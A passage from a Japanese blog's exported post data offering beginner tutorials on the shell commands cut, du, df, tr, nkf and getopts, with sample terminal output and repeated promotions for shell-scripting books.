切り出す位置のリストを文字数で指定する -f 1,3または1-3 切り出す位置のリストをタブ区切りのフィールドで指定する（区切り文字は「-d」オプションで変更可能） -d \u0026lsquo;文字\u0026rsquo; フィールドの区切り文字として、タブの代わりに使用する文字を指定する（1文字のみ） cutコマンド詳細説明 文字数を指定して切り出す cutコマンドで頭から4文字を切り出す\n$ STR=\u0026#34;Hello World\u0026#34; $ echo $string | cut -c 1-4 Hell bashの文字列変数で頭から4文字を切す\n$ STR=\u0026#34;Hello World\u0026#34; $ echo ${STR:0:4} Hell sedコマンドで先頭から4文字切り出す\n$ STR=\u0026#34;Hello World\u0026#34; $ echo \u0026#34;${STR}\u0026#34; | sed \u0026#39;s/^\\(.\\{4\\}\\).*$/\\1/\u0026#39; Hell フィールドを指定して切り出す フィールドの区切り文字は、デフォルトで ,(カンマ）とTAB(タブ）です。\n特に指定しなければ、cutコマンドが考えて区切り文字として認識してくれます。\nただカンマとTABが混在している場合は不安ですね。\n次の項で、区切り文字（デリミタ）を指定する方法を説明します。\n区切り文字のデフォルトがカンマとタブだから\n/etc/passwdのようにデリミタを指定しないときちんと区切られない。\n$ sudo cat /etc/passwd | cut -f 1,7 | tail _findmydevice:*:254:254:Find My Device Daemon:/var/db/findmydevice:/usr/bin/false _datadetectors:*:257:257:DataDetectors:/var/db/datadetectors:/usr/bin/false _captiveagent:*:258:258:captiveagent:/var/empty:/usr/bin/false _ctkd:*:259:259:ctkd Account:/var/empty:/usr/bin/false _applepay:*:260:260:applepay Account:/var/db/applepay:/usr/bin/false _hidd:*:261:261:HID Service User:/var/db/hidd:/usr/bin/false _cmiodalassistants:*:262:262:CoreMedia IO Assistants User:/var/db/cmiodalassistants:/usr/bin/false _analyticsd:*:263:263:Analytics Daemon:/var/db/analyticsd:/usr/bin/false _fpsd:*:265:265:FPS Daemon:/var/db/fpsd:/usr/bin/false _timed:*:266:266:Time Sync Daemon:/var/db/timed:/usr/bin/false デリミタを指定した場合はきちんと１番目、７番目のフィールドが切り取られました\nまずはcutコマンドで実現します。\n$ sudo cat /etc/passwd | cut -f 1,7 -d \u0026#39;:\u0026#39; | tail _findmydevice:/usr/bin/false _datadetectors:/usr/bin/false _captiveagent:/usr/bin/false _ctkd:/usr/bin/false _applepay:/usr/bin/false _hidd:/usr/bin/false _cmiodalassistants:/usr/bin/false _analyticsd:/usr/bin/false _fpsd:/usr/bin/false _timed:/usr/bin/false $ 同じことをawkコマンドでやってみます。デリミタの区切り指定は -F です。\n$ sudo cat /etc/passwd | awk -F \u0026#39;:\u0026#39; \u0026#39;{ print $1\u0026#34;:\u0026#34;$7;}\u0026#39; | tail _findmydevice:/usr/bin/false _datadetectors:/usr/bin/false _captiveagent:/usr/bin/false _ctkd:/usr/bin/false _applepay:/usr/bin/false _hidd:/usr/bin/false _cmiodalassistants:/usr/bin/false _analyticsd:/usr/bin/false _fpsd:/usr/bin/false _timed:/usr/bin/false $ ヒント 文字を切り出す方法にもいくつかありますし、フィールドの切り出しにもいろいろな方法があります。用途に合わせて使い分けてください。最初のうちは、一つの方法を覚えておけばよいです。 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-07-14T11:19:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-07-14-01-cut-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-07-14-01-cut-suzuki/","title":"（１６）【cut】シェルスクリプトコマンド活用紹介"},{"content":"duコマンド ディレクトリごとのディスク使用量を表示する ディスク使用量の合計だけを表示する カレントディレクトリ直下のファイル、ディレクトリごとの集計を表示する duコマンド概要 「du」は、ディスクの使用量をディレクトリごとに集計して表示するコマンドです。ファイルを指定した場合は指定したファイルのサイズのみ、ディレクトリを指定した場合はそのディレクトリおよび全てのサブディレクトリの使用量を集計します。対象を指定しなかった場合は、カレントディレクトリの使用量が表示されます。\nヒント duコマンドで最も使われるオプションは -h -s です。この組み合わせだけを覚えていれば大丈夫です。 duコマンドの書式 du [オプション] [ファイルまたはディレクトリ]\nduコマンドの主なオプション オプション 意味 -h サイズに応じて読みやすい単位で表示する -s 指定したディレクトリの合計のみを表示する duコマンド詳細説明 ディレクトリごとのディスク使用量を表示する $ du -h : : ＜どばーっとでてきます＞ : : ヒント あまりにもたくさん表示されて、なにがなんだかわかりませんね。大丈夫です。次の項で -s オプションを紹介します。 ディスク使用量の合計だけを表示する 指定したディレクトリの合計容量だけを表示したい場合は、「-s」オプションを使用します。\ndu -s で、カレントディレクトリが使用している容量が表示されます。\n$ du -h -s 1.4G\t. カレントディレクトリ直下のファイル、ディレクトリごとの集計を表示する カレントディレクトリ直下のファイル、またはディレクトリごとの集計値を表示するには、アスタリスク * をつけます。\ndu -h -s * で、カレントディレクトリ直下のファイルおよびディレクトリごとの集計となります。\n$ du -h -s * 72K\tAI_Algorithm_Game_Bash 440K\tAI_Algorithm_Game_Chess 276M\tAI_Algorithm_Game_Othello 971M\tAI_Algorithm_Game_RubiksCube 157M\tAI_Algorithm_Game_Shogi ヒント duコマンドはディレクトリ以下の使用量を表示するコマンドです。dfコマンド同様 -h でサイズが見やすく表示されます。 -s でカレントディレクトリの使用量が表示され、* をつけると、ディレクトリ内のサブディレクトリごとの使用量が表示されます。 du -h -s * のひとかたまりで覚えるのがポイントです。 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-07-13T13:28:32+09:00","image":"https://suzukiiichiro.github.io/posts/2022-07-13-01-du-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-07-13-01-du-suzuki/","title":"（１５）【du】シェルスクリプトコマンド活用紹介"},{"content":"dfコマンド ディスクの空き容量を調べる dfコマンド概要 「df」は、ディスクの空き領域（freeスペース）のサイズを集計して表示するコマンドです。引数でファイルやディレクトリを指定すると、そのファイルが保存されている場所の空き領域が表示されます。指定しなかった場合は、現在マウントされている全ての場所について空き領域を表示します。\nヒント dfコマンドで最も使われるオプションは -h です。この一つだけを覚えていれば大丈夫です。 dfコマンドの書式 df [オプション] [ファイル]\ndfコマンドの主なオプション オプション 意味 -h サイズに応じて読みやすい単位で表示する dfコマンド詳細説明 ディスクの空き容量を調べる 簡単です。\n$ df -h Filesystem Size Used Avail Capacity iused ifree %iused Mounted on /dev/disk1s1 466Gi 398Gi 64Gi 87% 2377176 9223372036852398631 0% / devfs 194Ki 194Ki 0Bi 100% 671 0 100% /dev /dev/disk1s4 466Gi 3.0Gi 64Gi 5% 5 9223372036854775802 0% /private/var/vm map -hosts 0Bi 0Bi 0Bi 100% 0 0 100% /net map auto_home 0Bi 0Bi 0Bi 100% 0 0 100% /home ヒント 要するに空き容量を確認するためのコマンドがdfで、-hオプションを付けることによって、サイズがわかりやすくなる、という仕組みです。深く考えるのはやめましょう。 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-07-13T13:01:11+09:00","image":"https://suzukiiichiro.github.io/posts/2022-07-13-01-df-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-07-13-01-df-suzuki/","title":"（１４）【df】シェルスクリプトコマンド活用紹介"},{"content":"trコマンド 文字を置換する 大文字／小文字を変換する 改行を除去する 固定長のデータをタブ区切りに変換する／カンマ区切りに変換する trコマンド概要 「tr」は、文字を置き換えるためのコマンドです。指定した文字を別の文字に置き換えたり、指定した文字を削除したり、文字が連続している場合には1つにまとめたりすることもできます。\nですが、sedでもっと細かく制御できるので、trは「改行を除去する」ためのコマンドに成り果ててしまいました。ここでは改行を除去することだけにフォーカスしてご説明します。\ntrコマンドの書式 tr [オプション] 文字セット1 [文字セット2]\ntrコマンドの主なオプション オプション 意味 -d \u0026lsquo;文字\u0026rsquo;を削除する trコマンド詳細説明 文字を置換する sedを使いましょう。\n$ tr 012 abc ヒント 012 という文字列を置き換えるのではなく、0をaに、1をbに、2をcに置き換えます。 大文字／小文字を変換する sedを使いましょう。\n大文字／小文字を変換する\n$ tr ABC abc ヒント ABC という文字列を置き換えるのではなく、Aをaに、Bをbに、Cをcに置き換えます。 また、文字を範囲で指定することも可能です。「tr A-Z a-z」で「A」は「a」に、「B」は「b」に……と対応する文字に置き換えられます。\n$ tr A-Z a-z 改行を除去する 「-d」オプションで、指定した文字を削除することができます。\nファイル中の改行を除去\n$ cat sample.txt | tr -d \u0026#39;\\n\u0026#39; \u0026gt; 出力ファイル名 文字列中の改行を除去\n$ echo \u0026#34;$string_sample\u0026#34; | tr -d \u0026#39;\\n\u0026#39; ヒント trコマンドの唯一の利点、sedより優れているただ一つの機能、それが tr -d \u0026lsquo;\\n\u0026rsquo; です。 重要 tr -d \u0026lsquo;\\n\u0026rsquo; のくくりはシングルクォーテーションである必要があります。ダブルクォーテーションではいけません。理由は「文字列」ではなく「文字（一文字）」しか扱えないからです。 固定長のデータをタブ区切りに変換する／カンマ区切りに変換する ls -la コマンドで普通に出力します。\n$ ls -la drwxr-xr-x 13 suzukiiichiro staff 416 7 14 13:31 ./ drwxrwxrwx+ 48 suzukiiichiro staff 1536 7 5 10:05 ../ drwxrwxrwx 7 suzukiiichiro staff 224 4 10 2020 AI_Algorithm_Game_Bash/ drwxrwxrwx 18 suzukiiichiro staff 576 4 10 2020 AI_Algorithm_Game_Chess/ drwxrwxrwx 39 suzukiiichiro staff 1248 4 10 2020 AI_Algorithm_Game_Othello/ drwxrwxrwx 31 suzukiiichiro staff 992 4 10 2020 AI_Algorithm_Game_RubiksCube/ drwxrwxrwx 33 suzukiiichiro staff 1056 4 10 2020 AI_Algorithm_Game_Shogi/ drwxrwxrwx 7 suzukiiichiro staff 224 4 10 2020 C_Othello/ 連続した空白をタブに変換します。\n$ ls -l | tr -s \u0026#34; \u0026#34; \u0026#34;\\t\u0026#34; total\t528 drwxrwxrwx\t7\tsuzukiiichiro\tstaff\t224\t4\t10\t2020\tAI_Algorithm_Game_Bash/ drwxrwxrwx\t18\tsuzukiiichiro\tstaff\t576\t4\t10\t2020\tAI_Algorithm_Game_Chess/ drwxrwxrwx\t39\tsuzukiiichiro\tstaff\t1248\t4\t10\t2020\tAI_Algorithm_Game_Othello/ drwxrwxrwx\t31\tsuzukiiichiro\tstaff\t992\t4\t10\t2020\tAI_Algorithm_Game_RubiksCube/ drwxrwxrwx\t33\tsuzukiiichiro\tstaff\t1056\t4\t10\t2020\tAI_Algorithm_Game_Shogi/ drwxrwxrwx\t7\tsuzukiiichiro\tstaff\t224\t4\t10\t2020\tC_Othello/ 連続した空白をカンマに変換します。\n$ ls -l | tr -s \u0026#34; \u0026#34; \u0026#34;,\u0026#34; drwxrwxrwx,7,suzukiiichiro,staff,224,4,10,2020,AI_Algorithm_Game_Bash/ drwxrwxrwx,18,suzukiiichiro,staff,576,4,10,2020,AI_Algorithm_Game_Chess/ drwxrwxrwx,39,suzukiiichiro,staff,1248,4,10,2020,AI_Algorithm_Game_Othello/ drwxrwxrwx,31,suzukiiichiro,staff,992,4,10,2020,AI_Algorithm_Game_RubiksCube/ drwxrwxrwx,33,suzukiiichiro,staff,1056,4,10,2020,AI_Algorithm_Game_Shogi/ drwxrwxrwx,7,suzukiiichiro,staff,224,4,10,2020,C_Othello/ 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-07-08T11:17:58+09:00","image":"https://suzukiiichiro.github.io/posts/2022-07-08-01-tr-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-07-08-01-tr-suzuki/","title":"（１３）【tr】シェルスクリプトコマンド活用紹介"},{"content":"nkfコマンド 文字コードと改行コードを変換する 文字コードを判定する 文字コードを変換してファイルを書き換える CentOS 7にnkfをインストールするには？ nkfコマンド概要 「nkf」は「Network Kanji Filter」の略で、LinuxとWindowsなど、異なるOS間でテキストデータを交換する際に問題となる文字コードと改行コードを変換するためのコマンドです。\nnkfコマンドの書式 nkf [オプション] [ファイル]\nnkf [オプション] \u0026ndash;overwrite ファイル\nnkfコマンドの主なオプション nkfにはオプションはありません。なお、オプション文字列の先頭に「:」記号を入れるかどうかによって、エラーメッセージ表示の有無を変更できます。\nオプション 意味 -j(入力は J) JISコードを出力する -e(入力は E) EUCコードを出力する -s(入力は S) シフトJISコードを出力する -w(入力は W) UTF-8コードを出力する（BOMなし） -Lu 改行をLFにする（UNIX系） -g 自動判別の結果を出力する \u0026ndash;overwrite ファイルを変換して上書きする ヒント UTF-8に変換する場合は $ nkf -wLu となります。\nこのオプションの意味は、改行コードをUNIX系のLFに変換してUTF-8で出力、です。 ヒント 一覧のオプションは一部です。 $ man nkf などで、nkfの使い方を確認してください。 nkfコマンド詳細説明 文字コードと改行コードを変換する kfは「nkf ファイル名」で指定したファイル、または標準入力から受け取った内容を変換して、標準出力に書き出します。\nLinux環境で扱いやすいように、文字コードを「UTF-8」（-wオプション）、改行コードを「LF」（-Luオプション）に変換するには、リダイレクトするか、「nkf -wLu 元ファイル \u0026gt; 保存ファイル名」のように指定します。なお、入力側の文字コードは自動で判定されます。\n改行コードはUNIX系のLFで、UTF-8で変換出力\n$ cat sjisFile.txt | nkf -wLu \u0026gt; 保存ファイル名.txt 文字コードを判定する 「-g（\u0026ndash;guess）」オプションを付けると、使用されている文字コードと改行コードの判定結果を表示することができます。\n得体のしれないファイルを調査する\n$ cat sjisFile.txt | nkf -g sjisFile.txt: UTF-8 (LF) 文字コードを変換してファイルを書き換える 「\u0026ndash;overwrite」オプションでは、指定したファイルの文字コードを変換して、直接書き換えることができます。\n文字コードを変換してファイルを書き換える\n$ cat sjisFile.txt | nkf -wLu --overwrite ヒント \u0026ndash;overwrite オプションで元のファイルを上書きするのは一見便利なオプションに見えますが、別ファイルに出力して、元のファイルは極力残すようにしておくべきだと思います。僕は。 CentOS 7にnkfをインストールするには？ rpmでインストール\n$ yum localinstall http://mirror.centos.org/centos/6/os/x86_64/Packages/nkf-2.0.8b-6.2.el6.x86_64.rpm ソースからインストール\n$ wget https://osdn.jp/dl/nkf/nkf-2.1.4.tar.gz $ tar -xzvf nkf-2.1.4.tar.gz $ cd nkf-2.1.4/ $ make $ sudo make install ヒント rpmやyumでインストールする場合と、ソースからインストールする場合、いずれも好みです。人それぞれのやり方や考え方でいいと思います。いずれ使い分けができるようになると思います。今はうまく行ったほうで頑張ってください。 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-07-08T10:22:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-07-08-01-nkf-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-07-08-01-nkf-suzuki/","title":"（１２）【nkf】シェルスクリプトコマンド活用紹介"},{"content":"getoptsコマンド オプションを解析する エラーメッセージを表示しない 引数付きのオプションを使用する getoptsコマンド概要 「getopts」は、bashのシェルスクリプト内でオプションを解析する際に役立つコマンドです。自作のシェルスクリプトで「-a」のような「ハイフン＋アルファベット1文字」のオプションを扱う際に便利です。「-f ファイル名」のように引数を取るオプションも解析できます。\n例えばこういうのです\n$ head -n10 文字列を渡すこともできます\n$ grep -f wordlist.txt ということで、自作のスクリプトでこういう事ができるわけです。\n$ myScript.sh -n10 -f addressList.txt ヒント 